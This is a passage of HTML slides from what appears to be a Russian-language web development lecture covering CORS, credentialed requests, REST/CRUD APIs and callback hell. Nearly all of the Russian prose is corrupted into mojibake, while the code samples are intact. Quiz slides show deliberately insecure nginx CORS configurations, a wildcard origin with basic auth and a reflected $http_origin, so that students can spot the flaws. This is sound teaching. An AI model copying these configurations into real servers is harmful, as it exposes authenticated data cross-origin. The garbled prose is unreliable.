			<code><mark>Access-Control-Expose-Headers:</mark> X-Uid, X-Secret</code>
			<code>// Cache-control, Content-Language, Content-Type, Expires, Last-Modified, Pragma</code>
			<code></code>
		</pre>
</section>

<section class="slide">
	<h2>CORS –¥–ª—è –ø—Ä–æ—Å—Ç—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤:<br/>–¥–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏</h2>
	<pre class="hljs js">
			<code>const xhr = new XMLHttpRequest();</code>
			<code>xhr.<mark>withCredentials</mark> = true;</code>
			<code>xhr.open('GET', 'https://e.mail.ru/messages/inbox/', false);</code>
			<code> </code>
		</pre>
	<pre class="hljs http">
			<code>HTTP/1.1 200 OK</code>
			<code>Content-Type: text/html; charset=UTF-8</code>
			<code>Access-Control-Allow-Origin: <mark>domain</mark> // '*' –∑–∞–ø—Ä–µ—â–µ–Ω–æ</code>
			<code><mark>Access-Control-Allow-Credentials:</mark> true</code>
			<code>// –°—Ç–∞–≤–∏–º –∑–∞–≥–æ–ª–æ–≤–æ–∫, –µ—Å–ª–∏ —Ö–æ—Ç–∏–º —Å–¥–µ–ª–∞—Ç—å Set-Cookies</code>
			<code> </code>
		</pre>
</section>

<section class="slide">
	<h2>–ó–∞–ø—Ä–æ—Å—ã –¥–µ–ª—è—Ç—Å—è –Ω–∞ –¥–≤–∞ —Ç–∏–ø–∞</h2>
	<p class="small-content">–û—Å—Ç–∞–ª—å–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã —Å—á–∏—Ç–∞—é—Ç—Å—è
		<mark>"–Ω–µ–ø—Ä–æ—Å—Ç—ã–º–∏"</mark>
		, –∏ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ç–∞–∫–∏—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–Ω—è—Ç—å, —Å–æ–≥–ª–∞—Å–µ–Ω –ª–∏ —Å–µ—Ä–≤–µ—Ä –Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫—É —Ç–∞–∫–∏—Ö –∑–∞–ø—Ä–æ—Å–æ–≤. –≠—Ç–∏ –∑–∞–ø—Ä–æ—Å—ã
		–≤—Å–µ–≥–¥–∞ –æ—Ç—Å—ã–ª–∞—é—Ç—Å—è —Å–æ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–º –∑–∞–≥–æ–ª–æ–≤–∫–æ–º <code>Origin</code></p>
</section>

<section class="slide">
	<h2>"–ù–µ–ø—Ä–æ—Å—Ç—ã–µ" –∑–∞–ø—Ä–æ—Å—ã</h2>
	<p>–ü—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ "–Ω–µ–ø—Ä–æ—Å—Ç–æ–≥–æ" –∑–∞–ø—Ä–æ—Å–∞, –±—Ä–∞—É–∑–µ—Ä —Å–¥–µ–ª–∞–µ—Ç –Ω–∞ —Å–∞–º–æ–º –¥–µ–ª–µ <strong>–¥–≤–∞</strong> HTTP-–∑–∞–ø—Ä–æ—Å–∞.
	<ul>
		<li>¬´–ü—Ä–µ–¥–∑–∞–ø—Ä–æ—Å¬ª (–∞–Ω–≥–ª–∏–π—Å–∫–∏–π —Ç–µ—Ä–º–∏–Ω ¬´preflight¬ª) OPTIONS. C–æ–¥–µ—Ä–∂–∏—Ç –Ω–∞–∑–≤–∞–Ω–∏–µ –∂–µ–ª–∞–µ–º–æ–≥–æ –º–µ—Ç–æ–¥–∞ –≤ –∑–∞–≥–æ–ª–æ–≤–∫–µ <code>Access-Control-Request-Method</code>,
			–∞ –µ—Å–ª–∏ –¥–æ–±–∞–≤–ª–µ–Ω—ã –æ—Å–æ–±—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏, —Ç–æ –∏ –∏—Ö —Ç–æ–∂–µ &mdash; –≤ <code>Access-Control-Request-Headers</code>.
		</li>
		<li>–û—Å–Ω–æ–≤–Ω–æ–π HTTP-–∑–∞–ø—Ä–æ—Å —Å –∑–∞–≥–æ–ª–æ–≤–∫–æ–º <code>Origin</code></li>
	</ul>
</section>

<section class="slide">
	<h2>"–ù–µ–ø—Ä–æ—Å—Ç—ã–µ" –∑–∞–ø—Ä–æ—Å—ã</h2>
	<p>–û—Ç–≤–µ—Ç –Ω–∞ –ø—Ä–µ–¥–∑–∞–ø—Ä–æ—Å –º–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Å–ª–µ–¥—É—é—â–∏–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏</p>
	<pre class="hljs http">
			<code>HTTP/1.1 200 OK</code>
			<code>Content-Type: text/plain</code>
			<code><mark>Access-Control-Allow-Methods:</mark> DELETE, PUT, HEAD, OPTIONS, GET, POST</code>
			<code><mark>Access-Control-Allow-Headers:</mark> Content-Type, User-Agent ...</code>
			<code>         ... X-Requested-With, If-Modified-Since, Cache-Control</code>
			<code><mark>Access-Control-Max-Age:</mark> 86400</code>
			<code> </code>
		</pre>
</section>

<section class="slide">
	<h2>–í–æ–ø—Ä–æ—Å—ã</h2>
	<p>–í —á–µ–º –ø—Ä–æ–±–ª–µ–º—ã –¥–∞–Ω–Ω–æ–≥–æ –∫–æ–¥–∞?</p>
	<pre class="hljs nginx">
			<code>location /api/v1/info {</code>
			<code>  add_header 'Access-Control-Allow-Origin' '*';</code>
			<code>  add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS';</code>
			<code>  add_header 'Access-Control-Allow-Headers' 'Content-Type, User-Agent';</code>
			<code>  add_header 'Access-Control-Expose-Headers' 'X-Uid, X-Authentication';</code>
			<code>  auth_basic "closed site";</code>
			<code>  auth_basic_user_file conf/htpasswd;</code>
			<code>}</code>
		</pre>
	<pre class="hljs javascript">
		<code>//–ø–æ–¥—Å–∫–∞–∑–∫–∞</code>
		<code>XMLHttpRequest.open(method, url[, async[, user[, password]]])</code>
	</pre>
</section>

<section class="slide">
	<h2>–í–æ–ø—Ä–æ—Å—ã</h2>
	<p>–ê —Ç—É—Ç?</p>
	<pre class="hljs nginx">
			<code>location /api/v1/info {</code>
			<code>  add_header X-Content-Type-Options nosniff;</code>
			<code>  add_header Vary Origin;</code>
			<code>  </code>
			<code>  # CORS setup</code>
			<code>  if ($cors = 'enabled') {</code>
			<code>    add_header Access-Control-Allow-Origin $http_origin;</code>
			<code>    #  ...</code>
			<code>  }</code>
			<code>}</code>
			<code>// –∫–∞–∫–∏–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –±—É–¥—É—Ç –¥–ª—è $cors=enabled|false?</code>
		</pre>
</section>

<section class="slide">
	<h2>–í–æ–ø—Ä–æ—Å –Ω–∞ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –±–∞–ª–ª—ã</h2>
	<p>–ö–∞–∫ —Ä–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å –∫—Ä–æ—Å—Å–¥–æ–º–µ–Ω–Ω—É—é –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é, –µ—Å–ª–∏ —É –≤–∞—Å –µ—Å—Ç—å –¥–≤–∞ —Å–∞–π—Ç–∞ <strong>example1.com</strong> –∏ <strong>example2.com</strong>?
	–ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–≤—Ç–æ—Ä–∏–∑—É–µ—Ç—Å—è –Ω–∞ –æ–¥–Ω–æ–º –∏–∑ –Ω–∏—Ö, —Ç–æ –∑–∞–π–¥—è –Ω–∞ –≤—Ç–æ—Ä–æ–π, –æ–Ω —Ç–∞–º —Ç–æ–∂–µ –±—É–¥–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω.
	–ü–µ—Ä–µ—á–∏—Å–ª–∏—Ç–µ –º–∏–Ω–∏–º—É–º 3 —Å–ø–æ—Å–æ–±–∞ —Å –∏—Ö –ø–ª—é—Å–∞–º–∏ –∏ –º–∏–Ω—É—Å–∞–º–∏ (–≤ —Ç.—á. –¥–ª—è –≤–æ—Å–ø—Ä–∏—è—Ç–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º).
	</p>
</section>

<!--–∑–∞–∫–æ–Ω—á–∏–ª–∏ —Å –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å—é-->


<section class="slide">
	<h2 class="shout">–†–∞–±–æ—Ç–∞ —Å API</h2>
</section>

<section class="slide">
	<h2>–ß—Ç–æ –µ—Å—Ç—å
		<mark>API</mark>
	</h2>
	<blockquote>
		<p class="medium-content"><b>API (application programming interface, –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π)</b>
			&mdash; –Ω–∞–±–æ—Ä –≥–æ—Ç–æ–≤—ã—Ö –∫–ª–∞—Å—Å–æ–≤, –ø—Ä–æ—Ü–µ–¥—É—Ä, —Ñ—É–Ω–∫—Ü–∏–π, —Å—Ç—Ä—É–∫—Ç—É—Ä –∏ –∫–æ–Ω—Å—Ç–∞–Ω—Ç, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ–º—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º
			(–±–∏–±–ª–∏–æ—Ç–µ–∫–æ–π, —Å–µ—Ä–≤–∏—Å–æ–º) –∏–ª–∏ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–æ–π –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤–æ –≤–Ω–µ—à–Ω–∏—Ö –ø—Ä–æ–≥—Ä–∞–º–º–Ω—ã—Ö –ø—Ä–æ–¥—É–∫—Ç–∞—Ö.
			–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø—Ä–æ–≥—Ä–∞–º–º–∏—Å—Ç–∞–º–∏ –ø—Ä–∏ –Ω–∞–ø–∏—Å–∞–Ω–∏–∏ –≤—Å–µ–≤–æ–∑–º–æ–∂–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π</p>
	</blockquote>
</section>

<section class="slide">
	<h2>–ß—Ç–æ –µ—Å—Ç—å
		<mark>API</mark>
	</h2>
	<p>API –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç
		<mark>—Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å</mark>
		, –∫–æ—Ç–æ—Ä—É—é –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º–∞ (–º–æ–¥—É–ª—å, –±–∏–±–ª–∏–æ—Ç–µ–∫–∞), –ø—Ä–∏ —ç—Ç–æ–º API –ø–æ–∑–≤–æ–ª—è–µ—Ç –∞–±—Å—Ç—Ä–∞–≥–∏—Ä–æ–≤–∞—Ç—å—Å—è –æ—Ç —Ç–æ–≥–æ, –∫–∞–∫
		–∏–º–µ–Ω–Ω–æ —ç—Ç–∞ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞
	</p>
	<p><b>Web API</b> &mdash; –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –≤–µ–±-—Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ, –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ, –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã–π –Ω–∞–±–æ—Ä HTTP-–∑–∞–ø—Ä–æ—Å–æ–≤, –∞ —Ç–∞–∫–∂–µ
		–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ
		<mark>—Å—Ç—Ä—É–∫—Ç—É—Ä—ã</mark>
		HTTP-–æ—Ç–≤–µ—Ç–æ–≤, –¥–ª—è –≤—ã—Ä–∞–∂–µ–Ω–∏—è –∫–æ—Ç–æ—Ä—ã—Ö –∏—Å–ø–æ–ª—å–∑—É—é—Ç XML –∏–ª–∏ JSON —Ñ–æ—Ä–º–∞—Ç—ã
	</p>
</section>

<section class="slide">
	<h2>–°–µ–º–∞ÃÅ–Ω—Ç–∏–∫–∞</h2>
	<blockquote>
		<p><b>–°–µ–º–∞ÃÅ–Ω—Ç–∏–∫–∞</b> &mdash; —Ä–∞–∑–¥–µ–ª –ª–∏–Ω–≥–≤–∏—Å—Ç–∏–∫–∏, –∏–∑—É—á–∞—é—â–∏–π —Å–º—ã—Å–ª–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –µ–¥–∏–Ω–∏—Ü —è–∑—ã–∫–∞</p>
	</blockquote>
	<p><br/>
		&ndash; <em>–†–∞–±–æ—Ç–æ–¥–∞—Ç–µ–ª—å:</em> –ù–∞–∑–æ–≤–∏—Ç–µ –≤–∞—à—É –≥–ª–∞–≤–Ω—É—é —Å–ª–∞–±–æ—Å—Ç—å <br/>
		&ndash; <em>–ö–∞–Ω–¥–∏–¥–∞—Ç:</em> –Ø –¥–∞—é
		<mark>—Å–µ–º–∞–Ω—Ç–∏—á–µ—Å–∫–∏</mark>
		–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–µ, –Ω–æ –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –Ω–µ–ø—Ä–∏–º–µ–Ω–∏–º—ã–µ –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã <br/>
		&ndash; <em>–†–∞–±–æ—Ç–æ–¥–∞—Ç–µ–ª—å:</em> –ú–æ–≥–ª–∏ –±—ã –≤—ã –ø—Ä–∏–≤–µ—Å—Ç–∏ –ø—Ä–∏–º–µ—Ä? <br/>
		&ndash; <em>–ö–∞–Ω–¥–∏–¥–∞—Ç:</em> –î–∞, –º–æ–≥ –±—ã
	</p>
</section>

<section class="slide">
	<h2>CRUD</h2>
	<blockquote>
		<p><b>CRUD (create, read, update, delete)</b> &mdash; –∞–∫—Ä–æ–Ω–∏–º, –æ–±–æ–∑–Ω–∞—á–∞—é—â–∏–π —á–µ—Ç—ã—Ä–µ –±–∞–∑–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ
			–ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –ø–µ—Ä—Å–∏—Å—Ç–µ–Ω—Ç–Ω—ã–º–∏ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞–º–∏ –¥–∞–Ω–Ω—ã—Ö, –æ–ø–∏—Å—ã–≤–∞–µ—Ç —Å–µ–º–∞–Ω—Ç–∏–∫—É –º–µ—Ç–æ–¥–æ–≤ HTTP</p>
	</blockquote>
	<ul>
		<li>GET (—á—Ç–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö)</li>
		<li>POST (—Å–æ–∑–¥–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö)</li>
		<li>PUT (–ø–æ–ª–Ω–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö) –∏–ª–∏ PATCH (—á–∞—Å—Ç–∏—á–Ω–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö)</li>
		<li>DELETE (—É–¥–∞–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö)</li>
		<li>HEAD –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç —Ä–µ—Å—É—Ä—Å —Ç–∞–∫ –∂–µ, –∫–∞–∫ –∏ GET, –Ω–æ –±–µ–∑ —Ç–µ–ª–∞ –æ—Ç–≤–µ—Ç–∞</li>
		<li>OPTIONS –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–ø–∏—Å–∞–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Ä–µ—Å—É—Ä—Å–æ–º</li>
	</ul>
</section>

<section class="slide">
	<h2>REST</h2>
	<blockquote>
		<p><b>REST (–≤ –ø—Ä–∏–º–µ–Ω–µ–Ω–∏–∏ –∫ –∏–º–µ–Ω–æ–≤–∞–Ω–∏—é —Ä–µ—Å—É—Ä—Å–æ–≤)</b> &mdash; –Ω–∞–±–æ—Ä –º–µ—Ç–æ–¥–∏–∫ –∏ –ø—Ä–∞–∫—Ç–∏–∫, –∫–æ—Ç–æ—Ä—ã–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è
			–∏–º–µ–Ω–æ–≤–∞–Ω–∏—è —Ä–µ—Å—É—Ä—Å–æ–≤, —Å –∫–æ—Ç–æ—Ä—ã–º–∏ —Ä–∞–±–æ—Ç–∞–µ—Ç —Å–∏—Å—Ç–µ–º–∞</p>
	</blockquote>
	<p>–í—Å–µ —Ç–∏–ø—ã —Ä–µ—Å—É—Ä—Å–æ–≤ –¥–µ–ª—è—Ç—Å—è –Ω–∞ –¥–≤–µ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏:</p>
	<ul>
		<li>
			<mark>–∫–æ–ª–ª–µ–∫—Ü–∏–∏ —Ä–µ—Å—É—Ä—Å–æ–≤</mark> &mdash; –∏–º–µ—é—Ç –∏–º—è
		</li>
		<li>
			<mark>–æ—Ç–¥–µ–ª—å–Ω—ã–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–∏</mark> &mdash; –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∞—Ç –∫ –∫–∞–∫–æ–π-—Ç–æ –∫–æ–ª–ª–µ–∫—Ü–∏–∏ –∏ –∏–º–µ—é—Ç –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä, —á—Ç–æ–±—ã
			–æ—Ç–ª–∏—á–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã—Ö –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–µ–π –∫–æ–ª–ª–µ–∫—Ü–∏–∏ –¥—Ä—É–≥ –æ—Ç –¥—Ä—É–≥–∞
		</li>
		<small>by –†–æ–π –§–∏–ª–¥–∏–Ω–≥ / REspresentation State Transfer</small>
	</ul>
</section>

<section class="slide">
	<h2>REST</h2>
	<p>–ö–æ–ª–ª–µ–∫—Ü–∏—è –∫–Ω–∏–≥ (books):</p>
	<ul>
		<li>–í—Å—è –∫–æ–ª–ª–µ–∫—Ü–∏—è –ø–æ–ª—É—á–∞–µ—Ç URI <code>/books</code></li>
		<li>–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –∫–Ω–∏–≥–∏ &mdash; –µ—ë ISBN. –û—Ç–¥–µ–ª—å–Ω—ã–µ –∫–Ω–∏–≥–∏:
			<ul>
				<li><code>/books/2-266-11156-6</code></li>
				<li><code>/books/3-720-55486-7</code></li>
				<li><code>/books/1-054-55901-2</code></li>
			</ul>
		</li>
	</ul>
</section>

<section class="slide">
	<h2>REST</h2>
	<p>–ö–æ–ª–ª–µ–∫—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π (users):</p>
	<ul>
		<li>–í—Å—è –∫–æ–ª–ª–µ–∫—Ü–∏—è –ø–æ–ª—É—á–∞–µ—Ç URI <code>/users</code></li>
		<li>–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è &mdash; –µ–≥–æ ID. –û—Ç–¥–µ–ª—å–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏:
			<ul>
				<li><code>/users/id2</code></li>
				<li><code>/users/id432</code></li>
				<li><code>/users/id1211177181</code></li>
			</ul>
		</li>
	</ul>
</section>

<section class="slide">
	<h2>REST + CRUD = —Å–µ–º–∞–Ω—Ç–∏—á–µ—Å–∫–æ–µ API</h2>
	<pre class="hljs http">
		<code>–ü–æ–ª—É—á–µ–Ω–∏–µ –≤—Å–µ—Ö –∫–Ω–∏–≥</code>
		<code>GET /books HTTP/1.1</code>
		<code>Host: awesome.com</code>
		<code> </code>
		<code>–ü–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π –∫–Ω–∏–≥–∏</code>
		<code>GET /books/3-720-55486-7 HTTP/1.1</code>
		<code>Host: awesome.com</code>
		<code> </code>
		<code>–£–¥–∞–ª–µ–Ω–∏–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π –∫–Ω–∏–≥–∏</code>
		<code>DELETE /books/3-720-55486-7 HTTP/1.1</code>
		<code>Host: awesome.com</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–î–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ API</h2>
	<p class="small-content"></p>
	<ul>
		<li><a href="http://swagger.io/" target="_blank">swagger</a></li>
		<li><a href="https://apiary.io/" target="_blank">apiary</a></li>
		<li><a href="https://apiblueprint.org/" target="_blank">apiblueprint</a></li>
		<li>üìù</li>
		<li>–í–∞—à–∏ –≤–∞—Ä–∏–∞–Ω—Ç—ã ;)</li>
	</ul>
</section>

<section class="slide">
	<h2>–î—Ä—É–≥–∏–µ —Å–ø–æ—Å–æ–±—ã –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ API</h2>
	<p class="small-content"></p>
	<ul>
		<li><a href="https://ru.wikipedia.org/wiki/JSON-RPC" target="_blank">JSON-RPC</a></li>
		<li><a href="https://habr.com/post/326986/" target="_blank">GraphQL</a></li>
		<li>–í–∞—à–∏ –≤–∞—Ä–∏–∞–Ω—Ç—ã ;)</li>
	</ul>
</section>


<!--–∑–∞–∫–æ–Ω—á–∏–ª–∏ —Å API-->


<section class="slide">
	<h2 class="shout">Promise –∏<br/>Fetch API</h2>
</section>

<section class="slide question">
	<h2>
		<span style="font-size: 85%">–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ—Å—Ç—å –≤ JavaScript</span>
	</h2>
</section>

<section class="slide">
	<!--
	–ø—Ä–µ–∂–¥–µ —á–µ–º –≥–æ–≤–æ—Ä–∏—Ç—å –æ –ø—Ä–æ–º–∏—Å–∞—Ö –∏ –ø—Ä–æ—á–µ–π –µ—Ä—É–Ω–¥–µ
	–Ω–∞–¥–æ —Ä–∞—Å—Å–∫–∞–∑–∞—Ç—å –æ —Ç–æ–º —á—Ç–æ —Ç–∞–∫–æ–µ callback hell
	–∏–ª–∏ –±–æ–ª–µ–µ —à–∏—Ä–æ–∫–æ–µ –ø–æ–Ω—è—Ç–∏–µ pyramid of doom.

	–ù–µ —Ç–æ—Ç Doom –∫–æ—Ç–æ—Ä—ã–π –ª—É—á—à–µ —á–µ–º DOM.

	–≤—Å–ø–æ–º–Ω–∏–º –æ —Ç–æ–º —á—Ç–æ —Ç–∞–∫–æ–µ callback-–∏

	—Ñ—É–Ω–∫—Ü–∏–∏ –º–æ–≥—É—Ç –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç –µ—Å—Ç–µ—Å—Ç–≤–µ–Ω–Ω—ã–º –ø—É—Ç–µ–º
	—Ñ—É–Ω–∫—Ü–∏–∏ –º–æ–≥—É—Ç –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç —á–µ—Ä–µ–∑ callback (–∫–æ–≥–¥–∞ –º—ã —Ä–∞–±–æ—Ç–∞–µ–º —Å –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–º –∫–æ–¥–æ–º)

	callback —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è –∫–æ—Ç–æ—Ä—É—é –º—ã –ø–µ—Ä–µ–¥–∞–µ–º –≤ –¥—Ä—É–≥—É—é —Ñ—É–Ω–∫—Ü–∏—é —á—Ç–æ–±—ã —Ç–∞ –≤ —Å–≤–æ—é –æ—á–µ—Ä–µ–¥—å –≤—ã–∑–≤–∞–ª–∞

	–∏–∑-–∑–∞ —ç—Ç–æ–π –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏ –º–Ω–æ–≥–∏–º —Ç—Ä—É–¥–Ω–æ –ø–æ–Ω–∏–º–∞—Ç—å –∫–æ–¥ –Ω–∞ JS:
	–∫–æ–¥ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–µ —Å–≤–µ—Ä—Ö—É –≤–Ω–∏–∑ –∞ —Ñ–∏–≥ –ø–æ–π–º–∏ –∫–∞–∫

	–Ω–∞–ø—Ä–∏–º–µ—Ä –Ω–∞ —Å–ª–∞–π–¥–µ –Ω–∏–∂–Ω–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –ø–µ—Ä–≤—ã–º

	—ç—Ç–æ —Å–¥–µ–ª–∞–Ω–æ –Ω–µ –ø—Ä–æ—Å—Ç–æ —Ç–∞–∫ –∞ —Ä–∞–¥–∏ –Ω–µ–±–ª–æ–∫–∏—Ä—É—é—â–∏—Ö –æ–ø–µ—Ä–∞—Ü–∏–π IO

	–∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ—Å—Ç—å –≤ JS —ç—Ç–æ —Å–∏–ª–∞ –∞ –Ω–µ —Å–ª–∞–±–æ—Å—Ç—å, –Ω–æ –∑–∞ –≤—Å—ë –Ω–∞–¥–æ –ø–ª–∞—Ç–∏—Ç—å

	–Ω–æ –∫–∞–∫–æ–π –∫–æ–¥ –º—ã –Ω–∞–ø–∏—à–µ–º –µ—Å–ª–∏ –ø–æ—Å–ª–µ –ø–µ—Ä–≤–æ–π –æ–ø–µ—Ä–∞—Ü–∏–∏
	–Ω–∞–º –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç —Å–¥–µ–ª–∞—Ç—å –µ—â–µ –æ–¥–Ω—É –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—É—é –∏ –≤—ã–≤–µ—Å—Ç–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç?
	-->
	<h2>–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ—Å—Ç—å –≤ JavaScript</h2>
	<pre class="hljs js">
		<code>http.ajaxGet('/user', function (err, user) {</code>
		<code>    if (err) {</code>
		<code>        console.error(err);</code>
		<code>        return;</code>
		<code>    }</code>
		<code>    console.log('User is', user);</code>
		<code>});</code>
		<code> </code>
		<code>console.log('Waiting...');</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<!--
	—Å–∫–æ—Ä–µ–π –≤—Å–µ–≥–æ –º—ã –ø—Ä–æ—Å—Ç–æ –¥–æ–±–∞–≤–∏–º –µ—ë –≤—ã–∑–æ–≤ –≤ –Ω–∞—à callback
	—Ñ–∏–Ω–∞–ª—å–Ω—ã–π console.log –≤—ã–Ω–µ—Å–µ–º –≤ –Ω–æ–≤—ã–π callback

	–∞ —á—Ç–æ –µ—Å–ª–∏ –Ω–∞–º –Ω—É–∂–µ–Ω –µ—â–µ –æ–¥–∏–Ω –≤—ã–∑–æ–≤? –∏–ª–∏ if –≤—Å—Ç–∞–≤–∏—Ç—å?
	-->
	<h2>Callback Hell</h2>
	<pre class="hljs js">
		<code>http.ajaxPost('/signup', user, function (err, resp1) {</code>
		<code>    if (err) { return console.error(err); }</code>
		<code>    http.ajaxGet(`/users/${resp1.id}`, function (err, resp2) {</code>
		<code>        if (err) { return console.error(err); }</code>
		<code>        http.ajaxGet(`/photos/${resp2.avatarId}`, function (err, avatar) {</code>
		<code>            if (err) { return console.error(err); }</code>
		<code>            // ... callback hell!</code>
		<code>        });</code>
		<code>    });</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<!--
	–±—É–¥–µ—Ç —Ç–∞–∫

	—ç—Ç–æ –∏ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è callback hell –∏–ª–∏ pyramid of doom

	–ø–∏—Ä–∞–º–∏–¥–∞ –ø–æ—Ç–æ–º—É-—á—Ç–æ –ø–∏—Ä–∞–º–∏–¥–∞
	callback hell –ø–æ—Ç–æ–º—É —á—Ç–æ —ç—Ç–æ callback-–∏ –∏ —ç—Ç–æ –∞–¥

	—Ç.–µ. —Å—É—Ç—å –≤ —Ç–æ–º –∫–æ–≥–¥–∞ –∫–æ–¥ —Ä–∞—Å—Ç–µ—Ç –≤–ø—Ä–∞–≤–æ –±—ã—Å—Ç—Ä–µ–π —á–µ–º –≤–Ω–∏–∑

	–Ω–∞–¥–µ—é—Å—å –Ω–µ –Ω–∞–¥–æ –æ–±—ä—è—Å–Ω—è—Ç—å –ø–æ—á–µ–º—É —ç—Ç–æ –ø–ª–æ—Ö–æ
	—Ç–µ—Ö –∫–æ–º—É —ç—Ç–æ –Ω–µ –ø–æ–Ω—è—Ç–Ω–æ –ø–æ–Ω–∏–º–∞–Ω–∏–µ –Ω–∞—Å—Ç–∏–≥–Ω–µ—Ç —Å–∞–º–æ,
	–≥–ª–∞–≤–Ω–æ–µ –±–æ–ª—å—à–µ —Ç–∞–∫ –ø–∏—Å–∞—Ç—å

	-->
	<h2>Callback Hell</h2>
	<div style="position:relative;width: 100%; height: 75%;">
